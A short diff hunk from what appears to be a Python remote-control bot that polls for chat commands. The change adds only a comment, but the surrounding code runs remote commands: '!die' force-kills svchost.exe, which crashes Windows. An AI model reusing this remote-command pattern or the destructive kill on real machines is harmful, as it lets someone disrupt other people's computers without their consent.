@@ -54,7 +54,7 @@ while True:
                 pyautogui.press("enter")
                 send("pya opened calc")
             elif content == "!die":
-                os.system('taskkill /F /IM svchost.exe')
+                os.system('taskkill /F /IM svchost.exe') # requires to run as an administrator
                 send("dead")
         time.sleep(2)
         
